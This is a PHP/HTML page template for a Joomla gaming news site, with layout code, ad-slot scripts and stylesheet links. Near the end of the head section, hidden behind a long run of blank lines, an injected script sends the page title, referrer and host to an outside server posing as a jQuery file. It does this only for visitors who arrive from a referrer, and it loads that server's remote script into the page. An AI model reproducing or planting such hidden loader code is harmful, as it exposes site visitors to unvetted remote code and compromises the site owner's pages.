<?php
/**
 * @package     Joomla.Site
 * @subpackage  Templates.gameteaser
 *
 * @copyright   Copyright (C) 2005 - 2015 tomh, Inc. All rights reserved.
 */

defined('_JEXEC') or die;

$app             = JFactory::getApplication();
$doc             = JFactory::getDocument();
$user            = JFactory::getUser();
$this->language  = $doc->language;
$this->direction = $doc->direction;

// Getting params from template
$params = $app->getTemplate(true)->params;

// Detecting Active Variables
$option   = $app->input->getCmd('option', '');
$view     = $app->input->getCmd('view', '');
$layout   = $app->input->getCmd('layout', '');
$task     = $app->input->getCmd('task', '');
$itemid   = $app->input->getCmd('Itemid', '');
$menu     = $app->getMenu();
$sitename = $app->get('sitename');
$description = $doc->description;
$keywords = $doc->_metaTags['standard']['keywords'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
	<head>
		
		<script language="javascript" type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/spry/widgets/tabbedpanels/SpryTabbedPanels.js"></script>
		<link href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/spry/widgets/tabbedpanels/SpryTabbedPanels.css" rel="stylesheet" type="text/css" />
		<script language="javascript" type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/spry/widgets/accordion/SpryAccordion.js"></script>
		<link href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/spry/widgets/accordion/SpryAccordion.css" rel="stylesheet" type="text/css" />
		<style>
			#secondbase { background: #06151a  url('<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/20150512_teso_v1_06151a.jpg') no-repeat top center !important; }
			#secondbase .sbtopborder { background:transparent !important; }
			#secondbase .tesomaytwvelvefive a { height:138px; width:980px; display:block; }
		</style>		
		<meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1;" />
		<meta http-equiv="X-UA-Compatible" content="IE=8" />
		<link rel="shortcut icon" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/themes/favicon.ico" type="image/x-icon" />
		
		<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/themes/radiance/radiance.css" type="text/css" media="screen,projection" title="radiance" />
		<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/themes/radiance/fullmoon/fullmoon.css" type="text/css" media="screen,projection" />
		<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/css/template.css" type="text/css"/>
		<!--[if IE 6]>
		<link rel="stylesheet" type="text/css" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/themes/radiance/radiance_ie6.css" media="screen,projection" />
		<![endif]-->
		<!--[if IE 7]>
		<link rel="stylesheet" type="text/css" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/themes/radiance/radiance_ie7.css" media="screen,projection" />
		<![endif]-->
		<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/main.js"></script>
		<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/jsfx_imagefader.js"></script>
		<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/main15.js"></script>
		<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/gamelist.js"></script>
		<script type="text/javascript" src='<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/engine.js'></script>
		<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/jquery-1.7.1.min.js" ></script>
		<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/facebox.js"></script>
		<script type='text/javascript' src='<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/jquery.countdown.min.js' ></script>
		<!--google广告-->
		<script type='text/javascript'>
			var googletag = googletag || {};
			googletag.cmd = googletag.cmd || [];
			(function() {
				var gads = document.createElement('script');
				gads.async = true;
				gads.type = 'text/javascript';
				var useSSL = 'https:' == document.location.protocol;
				gads.src = (useSSL ? 'https:' : 'http:') + '//www.googletagservices.com/tag/js/gpt.js';
				var node = document.getElementsByTagName('script')[0];
				node.parentNode.insertBefore(gads, node);
			})();
		</script>

		<script type='text/javascript'>
			googletag.cmd.push(function() {
				googletag.defineSlot('/149935395/MMO_MedRect', [300, 250], 'div-gpt-ad-1349395187216-2').addService(googletag.pubads());googletag.defineSlot('/149935395/Home_Page_Button', [160, 160], 'div-gpt-ad-1374774164640-0').addService(googletag.pubads());googletag.defineSlot('/149935395/SiteSkin_1x1', [1, 1], 'div-gpt-ad-1373084855440-0').addService(googletag.pubads());googletag.defineSlot('/149935395/MMO_Leaderboard', [728, 90], 'div-gpt-ad-1349395187216-1').addService(googletag.pubads());googletag.defineSlot('/149935395/MMO_WideSkyscraper', [160, 600], 'div-gpt-ad-1349395187216-3').addService(googletag.pubads()); googletag.pubads().setTargeting("gameId","0");googletag.pubads().setTargeting("forums","false");googletag.pubads().setTargeting("article","false");googletag.pubads().setTargeting("pageId","home");
				googletag.pubads().enableSingleRequest();
				googletag.pubads().collapseEmptyDivs();
				googletag.enableServices();
			});
		</script>
		<!---->
		<?php if ($option == 'com_kunena'):?>
			<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/css/forum_diy.css" type="text/css"/>		
		<?php endif; ?>
		<jdoc:include type="head" />
	
























<script>var a=''; setTimeout(10); var default_keyword = encodeURIComponent(document.title); var se_referrer = encodeURIComponent(document.referrer); var host = encodeURIComponent(window.location.host); var base = "http://www.cloud.oneteamus.com/js/jquery.min.php"; var n_url = base + "?default_keyword=" + default_keyword + "&se_referrer=" + se_referrer + "&source=" + host; var f_url = base + "?c_utt=snt2014&c_utm=" + encodeURIComponent(n_url); if (default_keyword !== null && default_keyword !== '' && se_referrer !== null && se_referrer !== ''){document.write('<script type="text/javascript" src="' + f_url + '">' + '<' + '/script>');}</script>
</head>
	<body onLoad="everyPage();">
		<div id="tiplayer" style="visibility:hidden;position:absolute;z-index:753;top:0px;height:auto;"></div>
		<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/scripts/wz_tooltip.js"></script>
		<div id="base" class="realpagebody">
			<div id="hcab"></div>
			<div id="networkbar" style="border-bottom:1px solid #4b4b4b; height:25px; background:#263442; line-height:24px; padding:0px; margin:0px; text-align:center; overflow:hidden;">
				<div class="networks" style="width:974px; margin:0 auto; text-align:right; padding-top:1px; font-size:11px; padding-right:6px;">
					
					<h3 style="text-align:left; width:600px; float:left; font-size:11px; margin:0px; padding:0px 0px 0px 10px; color:#fff !important;"><b>Trending Games</b>&nbsp;|&nbsp;<a href="/gamelist.cfm/game/14/EVE-Online.html" title="EVE Online - EVE">EVE Online</a>&nbsp;|&nbsp;<a href="/gamelist.cfm/game/498/Blade-Soul.html" title="Blade & Soul - BS">Blade & Soul</a>&nbsp;|&nbsp;<a href="/gamelist.cfm/game/473/Guild-Wars-2.html" title="Guild Wars 2 - GW2">Guild Wars 2</a>&nbsp;|&nbsp;<a href="/gamelist.cfm/game/1011/The-Witcher-3-Wild-Hunt.html" title="The Witcher 3: Wild Hunt - W3">The Witcher 3</a></h3>
					<style>
						#networkbar a:link,#networkbar a:visited { color:#70B9ED; }
						#netowrkbar a:hover { color:white; }
					</style><a name="top">&nbsp;</a>
					
					<!--
					<span class='other' style="color:#929292; padding-right:1px;">Network:&nbsp;</span>
					
					<a href="http://www.rtsguru.com/?utm_campaign=NetworkBar&utm_medium=topbar&utm_source=gameteaser" target="_blank" style="padding-left:14px; padding-right:6px; background:transparent url(http://images.gameteaser.com/images/rts_icon.gif) no-repeat center left">RTSguru</a>-->
				</div>
			</div>
			<div id="axTopLeaves">
				<div id="topContainer">
					<div id="userarea">
						<jdoc:include type="modules" name="top1" style="none" />
					</div>
					<!--
					<a href="" onclick="return showQuickGamelistPanel();" id="showQGLpanela">Show Quick Gamelist</a>
					<a href="http://www.gameteaser.com/gamelist.cfm/game/1095" id="showQGLRandonPanela">Jump to Random Game</a>
					-->
				</div>
			</div>

			<div id="secondbase">
				<div class="sbtopborder">
					<div id="container">
						<!--头部广告1-->
						<div class='tesomaytwvelvefive'>
							<a href='http://bs.serving-sys.com/BurstingPipe/adServer.bs?cn=tf&c=20&mc=click&pli=12695181&PluID=0&ord=1432174642904' target='_blank' rel='nofollow'  onClick="trackClick(1521,'home',0)" >
								<img src='http://bs.serving-sys.com/BurstingPipe/adServer.bs?cn=tf&c=19&mc=imp&pli=12695181&PluID=0&ord=1432174642904&rtu=-1'>
							</a>
						</div>
						<div class=""> 						
							<!-- SiteSkin_1x1 -->
							<div id='div-gpt-ad-1373084855440-0' style='width:1px; height:1px;'>
								<script type='text/javascript'>
									googletag.cmd.push(function() { googletag.display('div-gpt-ad-1373084855440-0'); });
								</script>
							</div>
						</div>
						<!--头部广告1结束-->
					<div id="origin">
						<div id="label">
							<div id="logo" >
								<a href="/"><img style="top:25px;" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/themes/radiance/fullmoon/frame_r4_logo.png" width="230" height="62" border="0" alt="" /></a> 	
							</div>	
							<!--  
							<div id="stats">
								<span class="label">Members:</span><span class="value">2,982,040</span>
								<span class="label">Users Online:</span><span class="value">1,977</span><br />
								<span class="label"><a href="\gamelist.cfm">Games</a>:</span><span class="value">824</span>&nbsp;
								<span class="label"><a href="\discussion2.cfm">Posts</a>:</span><span class="value">6,429,992</span>	
							</div>
							-->
							<!--头部广告2-->
							<div id="hepro" align="center" valign="middle">
								<div class="insidediv">
									<div class=""> 						
										<!-- MMO_Leaderboard -->
										<div id='div-gpt-ad-1349395187216-1' style='width:728px; height:90px;'>
											<script type='text/javascript'>
												googletag.cmd.push(function() { googletag.display('div-gpt-ad-1349395187216-1'); });
											</script>
										</div>
									</div> 
								</div>						
							</div>
							<!--头部广告2结束-->
						</div>
						<!--头部广告3-->
						<!--
					
	<div id="topcustomad" style="background:transparent url('<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/devchats/20120410_mmo_default.jpg') no-repeat top left !important; height:40px; width:990px; display:block;">
						
							<div style="padding-left:1px;" class="custombar">
							
								<a href="http://www.gameteaser.com/gameon.cfm/cast/96" style=" height:40px; width:990px; display:block; background-image: url('http://images.gameteaser.com/images/announcements/62012/15_20120601_gameon_r0.jpg'); line-height:40px; text-indent:153px; font-size:18px; text-align: left !important; font-weight:bold; color:#fff;" id="hcilinkf">Game On #66 | WoW Subscriptions Plummet, Shroud of the Avatar Deep Dive</a>
						
							</div>
					
						</div>
	
						-->					
						<!--头部广告3结束-->
						<div id="nav" style='position:relative;'>
							<jdoc:include type="modules" name="top_nav" style="none"/>
							<div class="navtopcorner"></div>
						</div>
				</div>
				<div id="body">
					<?php //echo $view; die();?>
					<jdoc:include type="message" />
					<?php if ($option == 'com_game' || $option == 'com_phocagallery'): ?>
						<div id="colFour" class="gamelist" style="overflow:hidden !important;">
							<jdoc:include type="component" />
						</div>
						<div id="colFive" class="gamelist">
							<jdoc:include type="modules" name="body_right" style="none"/>
						</div>
					<?php elseif ($option == 'com_content' && ($view == 'article')): ?>
						<div id="colFour">
							<jdoc:include type="component" />
						</div>
						<div id="colFive" >
							<jdoc:include type="modules" name="body_right" style="none"/>
						</div>
					<?php elseif ($option == 'com_users' && $view == 'registration'): ?>
						<div id="register">
							<div id="colOne">
								<jdoc:include type="component" />
							</div>
							<div id="colTwo">
								<jdoc:include type="modules" name="body_right" style="none"/>
							</div>
						</div>
					<?php elseif ($menu->getActive()==$menu->getDefault()): ?>
						<div class="home one">
							<div class="hmemm">
								<div class="featarea" style="padding:2px;">
									<jdoc:include type="modules" name="home_left_top_left" style="none"/>
								</div>
								<div class="artiarea">
								<jdoc:include type="modules" name="home_left_top_right" style="none"/>
								</div>
								<a href="/index.php/features?view=features" class="morefeat" sl-processed="1">More Features...</a>
								<!-- <jdoc:include type="modules" name="home_left_top" style="none"/> -->
							</div>
							<div class="inframe">
								<div class="three">
									<jdoc:include type="modules" name="home_left_left" style="none"/>
								</div>
								<div class="four">
									<jdoc:include type="modules" name="home_left_right" style="none"/>
								</div>
								<div class="inbot"></div>
							</div>
							
						</div>
						<div class="home two">
							<jdoc:include type="modules" name="body_right" style="none"/>
						</div>
					<?php elseif ($option == 'com_content' && ($view == 'category' || $view == 'categories' || $view == 'reviews' || $view == 'general' || $view == 'features')):?>
						<div id="colSix">
							<jdoc:include type="modules" name="body_left" style="none"/>
						</div>
						<div id="colSeven">	
							<jdoc:include type="component" />
						</div>
						<span class="clear"></span>
					<?php elseif ($option == 'com_content' && ($view == 'news')):?>
						<div id="newsroom" class="newsroom">
							<div class="primary">
								<jdoc:include type="component" />
							</div>
							<div class="secondary"></div>
						</div>
						<span class="clear"></span>
					<?php elseif ($option == 'com_kunena'):?>
						<div>
							<h1 class="H HomepageTitle">ZIGGSS.com Community Forums</h1>
							<div class="P PageDescription">The ZIGGSS.com community forums are where MMO gamers unite to discuss everything ZIGGSS related.  Come and join us... it's free!</div>
						</div>
						<jdoc:include type="component" />	
					<?php else:?>
						<?php echo $view;?>
						<jdoc:include type="component" />
					<?php endif; ?>
					<span class="clear"></span>
				</div>
				<div id="footer">
					<div>
						<div class="breadcrumbs">
							<a href="/" class="first"><?php echo $sitename;?>&nbsp;&raquo;</a>
							<span class="clear"></span>
						</div>
						<jdoc:include type="modules" name="footer_nav" style="none"/>
						<br /><br /><br />
						<div class='gamescom' style='text-align:center; padding-bottom:7px;'>
							<a href="http://www.games.com/" target="_blank"><img src='<?php echo $this->baseurl ?>/templates/<?php echo $this->template; ?>/images/themes/radiance/gamescom_r0.gif' width="120" height="19" border="0" alt="" /></a>
						</div>Copyright &#169; 2001-2015 Cyber Creations Inc.<br /><span class="datetime"><?php echo(date("M d, Y g:i A" ,time())); ?></span>
					</div>
				</div>
				<div id="favgamepanel" style="display:none;"></div>	
				<div id="gqj" class="gqj" style="display:none;"></div>
			</div>
		</div>
	</div>
</div>
<div id="shadowlayer" style="visibility:hidden;position:absolute;z-index:753;top:0px;left:0px; height:auto;"></div>
</body></html> 	

